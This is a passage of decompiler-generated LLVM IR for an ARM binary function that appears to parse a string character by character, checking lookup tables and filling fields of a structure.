  store i32 %v1_e480, i32* %r3.global-to-local, align 4
  %v9_e484 = icmp eq i32 %v1_e480, %v1_e484
  br i1 %v9_e484, label %dec_label_pc_e48c, label %dec_label_pc_e708

dec_label_pc_e48c:                                ; preds = %dec_label_pc_e480, %dec_label_pc_e468
  store i32 -2147483648, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e490

dec_label_pc_e490:                                ; preds = %dec_label_pc_e440, %dec_label_pc_e48c
  %v0_e490 = load i32, i32* @lr, align 4
  %v2_e490 = icmp eq i32 %v0_e490, 0
  br i1 %v2_e490, label %dec_label_pc_e498, label %dec_label_pc_e2b0

dec_label_pc_e498:                                ; preds = %dec_label_pc_e490
  %v0_e498 = load i32, i32* %r6.global-to-local, align 4
  %v1_e498 = inttoptr i32 %v0_e498 to i8*
  %v2_e498 = load i8, i8* %v1_e498, align 1
  %v3_e498 = zext i8 %v2_e498 to i32
  store i32 %v3_e498, i32* %r3.global-to-local, align 4
  %v7_e49c = icmp eq i8 %v2_e498, 46
  br i1 %v7_e49c, label %.thread22, label %dec_label_pc_e4b0

.thread22:                                        ; preds = %dec_label_pc_e498
  %v2_e4a0 = add i32 %v0_e498, 1
  store i32 %v2_e4a0, i32* %r6.global-to-local, align 4
  %v1_e4a4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v1_e4a4, i32* %r8.global-to-local, align 4
  store i32 -1, i32* @lr, align 4
  br label %dec_label_pc_e318

dec_label_pc_e4b0:                                ; preds = %dec_label_pc_e498
  %v0_e4b0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e4b0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_e4b8

dec_label_pc_e4b8:                                ; preds = %dec_label_pc_e2b0, %dec_label_pc_e4b0
  %v0_e4c0.pre = phi i32 [ %v0_e498, %dec_label_pc_e4b0 ], [ %v0_e4c0.pre.pre, %dec_label_pc_e2b0 ]
  %storemerge = phi i32 [ -1, %dec_label_pc_e4b0 ], [ %v0_e2b0, %dec_label_pc_e2b0 ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_16270.365 to i32), i32* %r1.global-to-local, align 4
  %v1_e4c0 = inttoptr i32 %v0_e4c0.pre to i8*
  br label %dec_label_pc_e4bc

dec_label_pc_e4bc:                                ; preds = %dec_label_pc_e4cc, %dec_label_pc_e4b8
  %v0_e4cc = phi i32 [ %v1_e4cc, %dec_label_pc_e4cc ], [ ptrtoint ([9 x i8]* @global_var_16270.365 to i32), %dec_label_pc_e4b8 ]
  %v1_e4bc = inttoptr i32 %v0_e4cc to i8*
  %v2_e4bc = load i8, i8* %v1_e4bc, align 1
  %v3_e4bc = zext i8 %v2_e4bc to i32
  store i32 %v3_e4bc, i32* %r2.global-to-local, align 4
  %v2_e4c0 = load i8, i8* %v1_e4c0, align 1
  %v3_e4c0 = zext i8 %v2_e4c0 to i32
  store i32 %v3_e4c0, i32* %r3.global-to-local, align 4
  %v9_e4c4 = icmp eq i8 %v2_e4c0, %v2_e4bc
  br i1 %v9_e4c4, label %dec_label_pc_e2b8, label %dec_label_pc_e4cc

dec_label_pc_e4cc:                                ; preds = %dec_label_pc_e4bc
  %v1_e4cc = add i32 %v0_e4cc, 1
  %v2_e4cc = inttoptr i32 %v1_e4cc to i8*
  %v3_e4cc = load i8, i8* %v2_e4cc, align 1
  %v4_e4cc = zext i8 %v3_e4cc to i32
  store i32 %v4_e4cc, i32* %r3.global-to-local, align 4
  store i32 %v1_e4cc, i32* %r1.global-to-local, align 4
  %v2_e4d0 = icmp eq i8 %v3_e4cc, 0
  br i1 %v2_e4d0, label %dec_label_pc_e4d8, label %dec_label_pc_e4bc

dec_label_pc_e4d8:                                ; preds = %dec_label_pc_e4cc, %dec_label_pc_e2b8
  %v1_e4f8 = phi i32 [ %v1_e2b8, %dec_label_pc_e2b8 ], [ %v0_e4c0.pre, %dec_label_pc_e4cc ]
  %v1_e4f4 = phi i32 [ %v0_e4cc, %dec_label_pc_e2b8 ], [ %v1_e4cc, %dec_label_pc_e4cc ]
  %v2_e4dc = sub i32 %v1_e4f4, ptrtoint ([9 x i8]* @global_var_16270.365 to i32)
  store i32 %v2_e4dc, i32* %r3.global-to-local, align 4
  %v8_e4e4 = icmp sgt i32 %v2_e4dc, 1
  br i1 %v8_e4e4, label %.thread25, label %dec_label_pc_e4e8

dec_label_pc_e4e8:                                ; preds = %dec_label_pc_e4d8
  %v1_e4e8 = inttoptr i32 %v1_e4f8 to i8*
  %v2_e4e8 = load i8, i8* %v1_e4e8, align 1
  %v3_e4e8 = zext i8 %v2_e4e8 to i32
  store i32 %v3_e4e8, i32* %r2.global-to-local, align 4
  %v1_e4ec = inttoptr i32 %v1_e4f4 to i8*
  %v2_e4ec = load i8, i8* %v1_e4ec, align 1
  %v3_e4ec = zext i8 %v2_e4ec to i32
  store i32 %v3_e4ec, i32* %r3.global-to-local, align 4
  %v9_e4f0 = icmp eq i8 %v2_e4e8, %v2_e4ec
  br i1 %v9_e4f0, label %bb135, label %.thread25

bb135:                                            ; preds = %dec_label_pc_e4e8
  %v2_e4f4 = add i32 %v1_e4f4, 9
  store i32 %v2_e4f4, i32* %r1.global-to-local, align 4
  %v2_e4f8 = add i32 %v1_e4f8, 1
  store i32 %v2_e4f8, i32* %r6.global-to-local, align 4
  br label %.thread25

.thread25:                                        ; preds = %dec_label_pc_e4e8, %dec_label_pc_e4d8, %bb135
  %v0_e500 = phi i32 [ %v1_e4f4, %dec_label_pc_e4e8 ], [ %v1_e4f4, %dec_label_pc_e4d8 ], [ %v2_e4f4, %bb135 ]
  %v0_e4fc = phi i32 [ %v1_e4f8, %dec_label_pc_e4e8 ], [ %v1_e4f8, %dec_label_pc_e4d8 ], [ %v2_e4f8, %bb135 ]
  %v1_e4fc = inttoptr i32 %v0_e4fc to i8*
  %v2_e4fc = load i8, i8* %v1_e4fc, align 1
  %v3_e4fc = zext i8 %v2_e4fc to i32
  store i32 %v3_e4fc, i32* %r2.global-to-local, align 4
  %v1_e500 = add i32 %v0_e500, 9
  %v2_e500 = inttoptr i32 %v1_e500 to i8*
  %v3_e500 = load i8, i8* %v2_e500, align 1
  %v4_e500 = zext i8 %v3_e500 to i32
  store i32 %v4_e500, i32* %r3.global-to-local, align 4
  %v2_e504 = icmp eq i8 %v2_e4fc, 0
  %v3_e508 = mul nuw nsw i32 %v4_e500, 256
  store i32 %v3_e508, i32* @lr, align 4
  br i1 %v2_e504, label %dec_label_pc_e708, label %dec_label_pc_e510

dec_label_pc_e510:                                ; preds = %.thread25
  %v3_e514 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_e514, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e518

dec_label_pc_e518:                                ; preds = %dec_label_pc_e59c, %dec_label_pc_e510
  %v1_e528 = phi i32 [ %v1_e59c, %dec_label_pc_e59c ], [ ptrtoint ([21 x i8]* @global_var_162b0.367 to i32), %dec_label_pc_e510 ]
  %v1_e518 = inttoptr i32 %v1_e528 to i8*
  %v2_e518 = load i8, i8* %v1_e518, align 1
  %v3_e518 = zext i8 %v2_e518 to i32
  store i32 %v3_e518, i32* %r3.global-to-local, align 4
  %v9_e51c = icmp eq i8 %v2_e518, %v2_e4fc
  br i1 %v9_e51c, label %dec_label_pc_e524, label %dec_label_pc_e59c

dec_label_pc_e524:                                ; preds = %dec_label_pc_e518
  store i32 ptrtoint ([21 x i8]* @global_var_162b0.367 to i32), i32* %r3.global-to-local, align 4
  %v2_e528 = sub i32 %v1_e528, ptrtoint ([21 x i8]* @global_var_162b0.367 to i32)
  store i32 %v2_e528, i32* %r2.global-to-local, align 4
  %v7_e530 = icmp slt i32 %v2_e528, 18
  br i1 %v7_e530, label %bb137, label %dec_label_pc_e534

dec_label_pc_e534:                                ; preds = %dec_label_pc_e524
  %v1_e534 = and i32 %v3_e508, 1024
  %v2_e534 = icmp eq i32 %v1_e534, 0
  br i1 %v2_e534, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_e534
  %v2_e538 = add i32 %v2_e528, -2
  store i32 %v2_e538, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_e524, %dec_label_pc_e534, %bb136
  %v0_e53c = phi i32 [ %v2_e528, %dec_label_pc_e524 ], [ %v2_e528, %dec_label_pc_e534 ], [ %v2_e538, %bb136 ]
  %v1_e53c = load i32, i32* %r7.global-to-local, align 4
  %v2_e53c = add i32 %v1_e53c, 32
  %v3_e53c = inttoptr i32 %v2_e53c to i32*
  store i32 %v0_e53c, i32* %v3_e53c, align 4
  store i32 ptrtoint (i32* @global_var_162a3.369 to i32), i32* %r1.global-to-local, align 4
  %v0_e548.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e544

dec_label_pc_e544:                                ; preds = %dec_label_pc_e544, %bb137
  %v0_e544 = phi i32 [ %v1_e544, %dec_label_pc_e544 ], [ ptrtoint (i32* @global_var_162a3.369 to i32), %bb137 ]
  %v1_e544 = add i32 %v0_e544, 1
  %v2_e544 = inttoptr i32 %v1_e544 to i8*
  %v3_e544 = load i8, i8* %v2_e544, align 1
  %v4_e544 = zext i8 %v3_e544 to i32
  store i32 %v4_e544, i32* %r3.global-to-local, align 4
  store i32 %v1_e544, i32* %r1.global-to-local, align 4
  %v8_e54c = icmp sgt i32 %v0_e548.pre, %v4_e544
  br i1 %v8_e54c, label %dec_label_pc_e544, label %dec_label_pc_e550

dec_label_pc_e550:                                ; preds = %dec_label_pc_e544
  store i32 ptrtoint (i32* @global_var_16294.373 to i32), i32* %r0.global-to-local, align 4
  %v2_e558 = sub i32 %v1_e544, ptrtoint (i32* @global_var_162a4.371 to i32)
  %v2_e55c = mul i32 %v2_e558, 2
  store i32 %v2_e55c, i32* %r3.global-to-local, align 4
  %v2_e564 = add i32 %v2_e55c, ptrtoint (i32* @global_var_16294.373 to i32)
  store i32 %v2_e564, i32* %r2.global-to-local, align 4
  %v1_e568 = add i32 %v2_e55c, add (i32 ptrtoint (i32* @global_var_16294.373 to i32), i32 1)
  %v2_e568 = inttoptr i32 %v1_e568 to i8*
  %v3_e568 = load i8, i8* %v2_e568, align 1
  %v4_e568 = zext i8 %v3_e568 to i32
  store i32 %v4_e568, i32* %r1.global-to-local, align 4
  %v2_e56c = add i32 %v2_e55c, ptrtoint (i32* @global_var_16284.375 to i32)
  store i32 %v2_e56c, i32* %r2.global-to-local, align 4
  %v3_e570 = inttoptr i32 %v2_e564 to i8*
  %v4_e570 = load i8, i8* %v3_e570, align 2
  %v6_e570 = zext i8 %v4_e570 to i32
  store i32 %v6_e570, i32* %r0.global-to-local, align 4
  %v1_e574 = add i32 %v2_e55c, add (i32 ptrtoint (i32* @global_var_16284.375 to i32), i32 1)
  %v2_e574 = inttoptr i32 %v1_e574 to i8*
  %v3_e574 = load i8, i8* %v2_e574, align 1
  %v4_e574 = zext i8 %v3_e574 to i32
  store i32 %v4_e574, i32* %r2.global-to-local, align 4
  %v3_e578 = inttoptr i32 %v2_e56c to i8*
  %v4_e578 = load i8, i8* %v3_e578, align 2
  %v6_e578 = zext i8 %v4_e578 to i32
  %v3_e57c = mul nuw i32 %v4_e568, 16777216
  store i32 %v3_e57c, i32* %r1.global-to-local, align 4
  %v4_e580 = sdiv i32 %v3_e57c, 65536
  %v5_e580 = or i32 %v6_e570, %v4_e580
  %v3_e584 = mul nuw i32 %v4_e574, 16777216
  store i32 %v3_e584, i32* %r2.global-to-local, align 4
  %v4_e588 = sdiv i32 %v3_e584, 65536
  %v5_e588 = or i32 %v6_e578, %v4_e588
  store i32 %v5_e588, i32* %r3.global-to-local, align 4
  %v0_e58c = load i32, i32* @lr, align 4
  %v2_e58c = or i32 %v5_e580, %v0_e58c
  store i32 ptrtoint ([21 x i8]* @global_var_162b0.367 to i32), i32* @ip, align 4
  %v2_e594 = and i32 %v2_e58c, %v5_e588
  store i32 %v2_e594, i32* %r0.global-to-local, align 4
  %v0_e5b0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_e5a8

dec_label_pc_e59c:                                ; preds = %dec_label_pc_e518
  %v1_e59c = add i32 %v1_e528, 1
  %v2_e59c = inttoptr i32 %v1_e59c to i8*
  %v3_e59c = load i8, i8* %v2_e59c, align 1
  %v4_e59c = zext i8 %v3_e59c to i32
  store i32 %v4_e59c, i32* %r3.global-to-local, align 4
  store i32 %v1_e59c, i32* @ip, align 4
  %v2_e5a0 = icmp eq i8 %v3_e59c, 0
  br i1 %v2_e5a0, label %dec_label_pc_e5a8, label %dec_label_pc_e518

dec_label_pc_e5a8:                                ; preds = %dec_label_pc_e59c, %dec_label_pc_e550
  %v0_e5b4 = phi i32 [ %v0_e58c, %dec_label_pc_e550 ], [ %v3_e508, %dec_label_pc_e59c ]
  %v0_e5b0 = phi i32 [ %v0_e5b0.pre, %dec_label_pc_e550 ], [ %v0_e4fc, %dec_label_pc_e59c ]
  %v0_e5a8 = phi i32 [ %v2_e594, %dec_label_pc_e550 ], [ %v3_e514, %dec_label_pc_e59c ]
  store i32 %v0_e5a8, i32* %stack_var_-36, align 4
  %v0_e5ac = load i32, i32* @r4, align 4
  %v1_e5ac = and i32 %v0_e5ac, 4
  %v1_e5b0 = inttoptr i32 %v0_e5b0 to i8*
  %v2_e5b0 = load i8, i8* %v1_e5b0, align 1
  %v3_e5b0 = zext i8 %v2_e5b0 to i32
  store i32 %v3_e5b0, i32* %r1.global-to-local, align 4
  %v1_e5b4 = and i32 %v0_e5b4, 3840
  %v1_e5b8 = and i32 %v0_e5ac, -5
  %v2_e5bc = or i32 %v1_e5b8, %v1_e5b4
  store i32 %v2_e5bc, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %tmp164 = mul nuw nsw i32 %v1_e5ac, 4
  %tmp165 = or i32 %tmp164, 32
  store i32 %tmp165, i32* %r3.global-to-local, align 4
  %v1_e5cc = load i32, i32* %r7.global-to-local, align 4
  %v2_e5cc = add i32 %v1_e5cc, 12
  %v3_e5cc = inttoptr i32 %v2_e5cc to i32*
  store i32 %v3_e5b0, i32* %v3_e5cc, align 4
  %v0_e5d0 = load i32, i32* %r7.global-to-local, align 4
  %v1_e5d0 = add i32 %v0_e5d0, 4
  %v2_e5d0 = inttoptr i32 %v1_e5d0 to i32*
  %v3_e5d0 = load i32, i32* @r5, align 4
  store i32 %v3_e5d0, i32* %v2_e5d0, align 4
  %v4_e5d0 = add i32 %v0_e5d0, 8
  %v5_e5d0 = inttoptr i32 %v4_e5d0 to i32*
  %v6_e5d0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v6_e5d0, i32* %v5_e5d0, align 4
  %v0_e5d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_e5d4 = load i32, i32* %r7.global-to-local, align 4
  %v2_e5d4 = add i32 %v1_e5d4, 20
  %v3_e5d4 = inttoptr i32 %v2_e5d4 to i32*
  store i32 %v0_e5d4, i32* %v3_e5d4, align 4
  %v0_e5d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_e5d8 = load i32, i32* %r7.global-to-local, align 4
  %v2_e5d8 = add i32 %v1_e5d8, 16
  %v3_e5d8 = inttoptr i32 %v2_e5d8 to i32*
  store i32 %v0_e5d8, i32* %v3_e5d8, align 4
  %v0_e5dc = load i32, i32* %r0.global-to-local, align 4
  %v1_e5dc = load i32, i32* %r7.global-to-local, align 4
  %v2_e5dc = add i32 %v1_e5dc, 28
  %v3_e5dc = inttoptr i32 %v2_e5dc to i32*
  store i32 %v0_e5dc, i32* %v3_e5dc, align 4
  %v0_e5e0 = load i32, i32* @ip, align 4
  %v1_e5e0 = inttoptr i32 %v0_e5e0 to i8*
  %v2_e5e0 = load i8, i8* %v1_e5e0, align 1
  %v3_e5e0 = zext i8 %v2_e5e0 to i32
  store i32 %v3_e5e0, i32* %r2.global-to-local, align 4
  %v2_e5e4 = icmp eq i8 %v2_e5e0, 0
  br i1 %v2_e5e4, label %dec_label_pc_e5ec, label %dec_label_pc_e604

dec_label_pc_e5ec:                                ; preds = %dec_label_pc_e5a8
  %v0_e5ec = load i32, i32* %r6.global-to-local, align 4
  %v1_e5ec = inttoptr i32 %v0_e5ec to i8*
  %v2_e5ec = load i8, i8* %v1_e5ec, align 1
  %v3_e5ec = zext i8 %v2_e5ec to i32
  store i32 %v3_e5ec, i32* %r3.global-to-local, align 4
  %v7_e5f0 = icmp eq i8 %v2_e5ec, 109
  br i1 %v7_e5f0, label %dec_label_pc_e5f8, label %dec_label_pc_e708

dec_label_pc_e5f8:                                ; preds = %dec_label_pc_e5ec
  store i32 20, i32* %r3.global-to-local, align 4
  %v1_e5fc = load i32, i32* %r7.global-to-local, align 4
  %v2_e5fc = add i32 %v1_e5fc, 32
  %v3_e5fc = inttoptr i32 %v2_e5fc to i32*
  store i32 20, i32* %v3_e5fc, align 4
  %v0_e600 = load i32, i32* %r2.global-to-local, align 4
  %v1_e600 = load i32, i32* %r7.global-to-local, align 4
  %v2_e600 = add i32 %v1_e600, 28
  %v3_e600 = inttoptr i32 %v2_e600 to i32*
  store i32 %v0_e600, i32* %v3_e600, align 4
  br label %dec_label_pc_e604

dec_label_pc_e604:                                ; preds = %dec_label_pc_e5a8, %dec_label_pc_e5f8
  %v0_e604 = load i32, i32* %sb.global-to-local, align 4
  %tmp141 = icmp slt i32 %v0_e604, 1
  br i1 %tmp141, label %dec_label_pc_e6bc, label %dec_label_pc_e60c

dec_label_pc_e60c:                                ; preds = %dec_label_pc_e604
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_e610

dec_label_pc_e610:                                ; preds = %dec_label_pc_e6a4, %dec_label_pc_e60c
  %v8_e62c = phi i32 [ 0, %dec_label_pc_e60c ], [ %v1_e6a8, %dec_label_pc_e6a4 ]
  %v7_e614 = icmp sgt i32 %v8_e62c, 2
  br i1 %v7_e614, label %bb143, label %bb142

bb142:                                            ; preds = %dec_label_pc_e610
  store i32 %v25_e274, i32* %r2.global-to-local, align 4
  %v12_e618 = mul i32 %v8_e62c, 4
  %v13_e618 = add i32 %v12_e618, %v25_e274
  store i32 %v13_e618, i32* %r3.global-to-local, align 4
  %v9_e61c = add i32 %v13_e618, -24
  %v10_e61c = inttoptr i32 %v9_e61c to i32*
  %v11_e61c = load i32, i32* %v10_e61c, align 4
  store i32 %v11_e61c, i32* %r2.global-to-local, align 4
  %v9_e620 = load i32, i32* %r7.global-to-local, align 4
  %v10_e620 = add i32 %v9_e620, %v8_e62c
  store i32 %v10_e620, i32* %r3.global-to-local, align 4
  %v9_e628 = trunc i32 %v11_e61c to i8
  %v11_e628 = add i32 %v10_e620, 36
  %v12_e628 = inttoptr i32 %v11_e628 to i8*
  store i8 %v9_e628, i8* %v12_e628, align 1
  %v8_e630 = load i32, i32* %r3.global-to-local, align 4
  %v9_e630 = add i32 %v8_e630, 36
  %v10_e630 = inttoptr i32 %v9_e630 to i8*
  %v11_e630 = load i8, i8* %v10_e630, align 1
  %v12_e630 = zext i8 %v11_e630 to i32
  br label %bb144

bb143:                                            ; preds = %dec_label_pc_e610
  %v10_e62c = add i32 %v8_e62c, %stack_var_-48.3
  store i32 %v10_e62c, i32* %r3.global-to-local, align 4
  %v9_e634 = add i32 %v10_e62c, -2
  br label %bb144

bb144:                                            ; preds = %bb142, %bb143
  %v0_e658 = phi i32 [ %v12_e630, %bb142 ], [ %v9_e634, %bb143 ]
  store i32 %v0_e658, i32* @r2, align 4
  %v1_e638 = load i32, i32* %sb.global-to-local, align 4
  %v2_e638 = sub i32 %v0_e658, %v1_e638
  %v4_e638 = xor i32 %v1_e638, %v0_e658
  %v5_e638 = xor i32 %v2_e638, %v0_e658
  %v6_e638 = and i32 %v5_e638, %v4_e638
  %v7_e638 = icmp slt i32 %v6_e638, 0
  %v8_e638 = icmp slt i32 %v2_e638, 0
  %v9_e638 = icmp eq i32 %v0_e658, %v1_e638
  %v3_e63c = xor i1 %v8_e638, %v7_e638
  %v4_e63c = or i1 %v9_e638, %v3_e63c
  br i1 %v4_e63c, label %dec_label_pc_e64c, label %dec_label_pc_e640

dec_label_pc_e640:                                ; preds = %bb144
  %v1_e640 = add i32 %v0_e658, -9
  %v3_e640 = sub i32 8, %v0_e658
  %v4_e640 = and i32 %v3_e640, %v0_e658
  %v5_e640 = icmp slt i32 %v4_e640, 0
  %v6_e640 = icmp slt i32 %v1_e640, 0
  %v7_e640 = icmp eq i32 %v0_e658, 9
  %v3_e644 = xor i1 %v6_e640, %v5_e640
  %v4_e644 = or i1 %v7_e640, %v3_e644
  br i1 %v4_e644, label %dec_label_pc_e648, label %dec_label_pc_e708

dec_label_pc_e648:                                ; preds = %dec_label_pc_e640
  store i32 %v0_e658, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_e64c

dec_label_pc_e64c:                                ; preds = %bb144, %dec_label_pc_e648
  store i32 %v25_e274, i32* @ip, align 4
  %v1_e650 = load i32, i32* %r8.global-to-local, align 4
  %v4_e650 = mul i32 %v1_e650, 4
  %v5_e650 = add i32 %v4_e650, %v25_e274
  store i32 %v5_e650, i32* %r3.global-to-local, align 4
  %v1_e654 = add i32 %v5_e650, -12
  %v2_e654 = inttoptr i32 %v1_e654 to i32*
  %v3_e654 = load i32, i32* %v2_e654, align 4
  store i32 %v3_e654, i32* %r5.global-to-local, align 4
  %v1_e658 = add i32 %v0_e658, -1
  store i32 %v1_e658, i32* %sl.global-to-local, align 4
  %v0_e65c = load i32, i32* %r7.global-to-local, align 4
  %v4_e65c = mul i32 %v1_e658, 4
  %v5_e65c = add i32 %v0_e65c, %v4_e65c
  store i32 %v5_e65c, i32* %r3.global-to-local, align 4
  %v7_e660 = icmp eq i32 %v3_e654, 8
  %v1_e664 = add i32 %v5_e65c, 40
  %v2_e664 = inttoptr i32 %v1_e664 to i32*
  %v3_e664 = load i32, i32* %v2_e664, align 4
  store i32 %v3_e664, i32* @r0, align 4
  br i1 %v7_e660, label %dec_label_pc_e6a4, label %dec_label_pc_e66c

dec_label_pc_e66c:                                ; preds = %dec_label_pc_e64c
  %v9_e66c = icmp eq i32 %v3_e664, %v3_e654
  br i1 %v9_e66c, label %dec_label_pc_e690, label %bb145

bb145:                                            ; preds = %dec_label_pc_e66c
  %v8_e670 = icmp eq i32 %v3_e664, 8
  br i1 %v8_e670, label %dec_label_pc_e690, label %dec_label_pc_e678

dec_label_pc_e678:                                ; preds = %bb145
  %v0_e678 = call i32 @function_e228()
  %v0_e680 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_e680, i32* @r0, align 4
  %v0_e684 = call i32 @function_e228()
  store i32 %v0_e684, i32* %r0.global-to-local, align 4
  %v8_e68c = icmp sgt i32 %v0_e678, %v0_e684
  br i1 %v8_e68c, label %dec_label_pc_e6a4, label %dec_label_pc_e678.dec_label_pc_e690_crit_edge

dec_label_pc_e678.dec_label_pc_e690_crit_edge:    ; preds = %dec_label_pc_e678
  %v1_e694.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_e69c.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_e69c.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_e690

dec_label_pc_e690:                                ; preds = %dec_label_pc_e678.dec_label_pc_e690_crit_edge, %dec_label_pc_e66c, %bb145
  %v1_e69c = phi i32 [ %v1_e69c.pre, %dec_label_pc_e678.dec_label_pc_e690_crit_edge ], [ %v1_e658, %dec_label_pc_e66c ], [ %v1_e658, %bb145 ]
  %v0_e69c = phi i32 [ %v0_e69c.pre, %dec_label_pc_e678.dec_label_pc_e690_crit_edge ], [ %v0_e65c, %dec_label_pc_e66c ], [ %v0_e65c, %bb145 ]
  %v1_e694 = phi i32 [ %v1_e694.pre, %dec_label_pc_e678.dec_label_pc_e690_crit_edge ], [ %v1_e650, %dec_label_pc_e66c ], [ %v1_e650, %bb145 ]
  store i32 %v25_e274, i32* %r1.global-to-local, align 4
  %v4_e694 = mul i32 %v1_e694, 4
  %v5_e694 = add i32 %v4_e694, %v25_e274
  store i32 %v5_e694, i32* %r3.global-to-local, align 4
  %v1_e698 = add i32 %v5_e694, -12
  %v2_e698 = inttoptr i32 %v1_e698 to i32*
  %v3_e698 = load i32, i32* %v2_e698, align 4
  store i32 %v3_e698, i32* @r2, align 4
  %v4_e69c = mul i32 %v1_e69c, 4
  %v5_e69c = add i32 %v4_e69c, %v0_e69c
  store i32 %v5_e69c, i32* %r3.global-to-local, align 4
  %v2_e6a0 = add i32 %v5_e69c, 40
  %v3_e6a0 = inttoptr i32 %v2_e6a0 to i32*
  store i32 %v3_e698, i32* %v3_e6a0, align 4
  br label %dec_label_pc_e6a4

dec_label_pc_e6a4:                                ; preds = %dec_label_pc_e678, %dec_label_pc_e64c, %dec_label_pc_e690
  %v0_e6a4 = load i32, i32* %r7.global-to-local, align 4
  %v1_e6a4 = add i32 %v0_e6a4, 28
  %v2_e6a4 = inttoptr i32 %v1_e6a4 to i32*
  %v3_e6a4 = load i32, i32* %v2_e6a4, align 4
  %v0_e6a8 = load i32, i32* %r8.global-to-local, align 4
  %v1_e6a8 = add i32 %v0_e6a8, 1
  store i32 %v1_e6a8, i32* %r8.global-to-local, align 4
  %v1_e6ac = add i32 %v3_e6a4, 2
  store i32 %v1_e6ac, i32* %r3.global-to-local, align 4
  %v6_e6b4 = icmp slt i32 %v1_e6a8, %v1_e6ac
  br i1 %v6_e6b4, label %dec_label_pc_e610, label %dec_label_pc_e6d4

dec_label_pc_e6bc:                                ; preds = %dec_label_pc_e604
  %v0_e6bc = load i32, i32* %r7.global-to-local, align 4
  %v1_e6bc = add i32 %v0_e6bc, 28
  %v2_e6bc = inttoptr i32 %v1_e6bc to i32*
  %v3_e6bc = load i32, i32* %v2_e6bc, align 4
  store i32 %v3_e6bc, i32* %r2.global-to-local, align 4
  %v0_e6c0 = load i32, i32* %r0.global-to-local, align 4
  %v1_e6c0 = trunc i32 %v0_e6c0 to i8
  %v3_e6c0 = add i32 %v0_e6bc, 38
  %v4_e6c0 = inttoptr i32 %v3_e6c0 to i8*
  store i8 %v1_e6c0, i8* %v4_e6c0, align 1
  %v0_e6c4 = load i32, i32* %r2.global-to-local, align 4
  %v3_e6c4 = mul i32 %v0_e6c4, 4
  store i32 %v3_e6c4, i32* @r2, align 4
  %v0_e6c8 = load i32, i32* %r7.global-to-local, align 4
  %v1_e6c8 = add i32 %v0_e6c8, 40
  store i32 %v1_e6c8, i32* @r0, align 4
  %v2_e6cc = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_e6cc, i32* @r1, align 4
  %v0_e6d0 = call i32 @function_ef60()
  store i32 %v0_e6d0, i32* %r0.global-to-local, align 4
  %v0_e6d4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_e6d4

dec_label_pc_e6d4:                                ; preds = %dec_label_pc_e6a4, %dec_label_pc_e6bc
  %v2_e6f0 = phi i32 [ %v0_e6d4.pre, %dec_label_pc_e6bc ], [ %v0_e6a4, %dec_label_pc_e6a4 ]
  %v1_e6d4 = add i32 %v2_e6f0, 16
  %v2_e6d4 = inttoptr i32 %v1_e6d4 to i32*
  %v3_e6d4 = load i32, i32* %v2_e6d4, align 4
  store i32 %v3_e6d4, i32* %r3.global-to-local, align 4
  %v1_e6d8 = and i32 %v3_e6d4, 128
  %v2_e6d8 = icmp eq i32 %v1_e6d8, 0
  br i1 %v2_e6d8, label %.thread46, label %.thread44

.thread44:                                        ; preds = %dec_label_pc_e6d4
  store i32 %v2_e27c, i32* %r3.global-to-local, align 4
  %v2_e6e0 = inttoptr i32 %v2_e6f0 to i32*
  %v3_e6e0 = load i32, i32* %v2_e6e0, align 4
  %v2_e6e8.pre = load i32, i32* %r6.global-to-local, align 4
  %v3_e6e8 = sub i32 %v2_e6e8.pre, %v2_e27c
  store i32 %v3_e6e8, i32* %r3.global-to-local, align 4
  %v5_e6ec = mul i32 %v3_e6e8, 4
  %v6_e6ec = add i32 %v5_e6ec, %v3_e6e0
  store i32 %v6_e6ec, i32* @r2, align 4
  br label %bb146

.thread46:                                        ; preds = %dec_label_pc_e6d4
  %v1_e6e441 = load i32, i32* %r6.global-to-local, align 4
  %v2_e6e442 = add i32 %v1_e6e441, 1
  store i32 %v2_e6e442, i32* %r3.global-to-local, align 4
  %v3_e6f0 = inttoptr i32 %v2_e6f0 to i32*
  store i32 %v2_e6e442, i32* %v3_e6f0, align 4
  %v0_e6f4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %bb146

bb146:                                            ; preds = %.thread44, %.thread46
  %v1_e6fc = phi i32 [ %v2_e6f0, %.thread44 ], [ %v0_e6f4.pre, %.thread46 ]
  %v1_e6f4 = add i32 %v1_e6fc, 28
  %v2_e6f4 = inttoptr i32 %v1_e6f4 to i32*
  %v3_e6f4 = load i32, i32* %v2_e6f4, align 4
  store i32 %v3_e6f4, i32* %r3.global-to-local, align 4
  %v1_e6f8 = add i32 %v3_e6f4, 2
  store i32 %v1_e6f8, i32* %r0.global-to-local, align 4
  %v0_e6fc = load i32, i32* %sb.global-to-local, align 4
  %v2_e6fc = add i32 %v1_e6fc, 24
  %v3_e6fc = inttoptr i32 %v2_e6fc to i32*
  store i32 %v0_e6fc, i32* %v3_e6fc, align 4
  br i1 %v2_e6d8, label %dec_label_pc_e70c, label %bb147

bb147:                                            ; preds = %bb146
  %v1_e700 = load i32, i32* @r2, align 4
  %v2_e700 = load i32, i32* %r7.global-to-local, align 4
  %v3_e700 = inttoptr i32 %v2_e700 to i32*
  store i32 %v1_e700, i32* %v3_e700, align 4
  br label %dec_label_pc_e70c

